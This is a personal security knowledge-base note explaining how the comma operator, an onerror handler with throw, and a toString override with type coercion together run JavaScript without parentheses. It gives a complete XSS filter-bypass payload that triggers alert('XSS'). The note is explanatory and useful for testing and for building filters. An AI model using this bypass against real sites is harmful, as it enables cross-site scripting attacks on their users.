---
id: "202607090002"
title: Comma operator plus onerror and throw calls a function without its name or parens
date: 2026-07-09
type: concept
tags: [xss, javascript, filter-bypass]
publish: false
---

Three JavaScript quirks combine into a way to call an arbitrary function while writing neither its name followed by `(` `)`, nor any string literal:

**1. The comma operator chains expressions in one statement:**
```javascript
a, b, c   // a runs, then b, then c — no semicolons, no block needed
```

**2. `throw` + `window.onerror` calls a function implicitly:**
```javascript
onerror = alert     // sets the global error handler to `alert`
throw 'XSS'         // throws — uncaught, so window.onerror('XSS') fires
                    // → alert('XSS') runs, without ever writing alert(...)
```

**3. Type coercion forces a call to an overridden `toString`:**
```javascript
toString = x        // replace window.toString with function x
window + ''         // '+' coerces window to a string → calls window.toString()
                    // → x() runs, without ever writing x()
```

Chained together as one expression: `x=x=>{throw/**/onerror=alert,'XSS'},toString=x,window+''` — defines `x`, installs it as `toString`, then forces the coercion that invokes it, which in turn throws into `onerror`. The entire chain never writes a literal function call `name(...)` for the actual `alert`, which is exactly what's needed when `(` and `)` are blocked characters. This is the general escape hatch whenever a filter blocks parentheses specifically: assignment, the comma operator, and forced type coercion all execute code without requiring call syntax.

## Links
- Applied in: [[202607090001 Parenthesis and quote-free JS execution inside a javascript URI]]
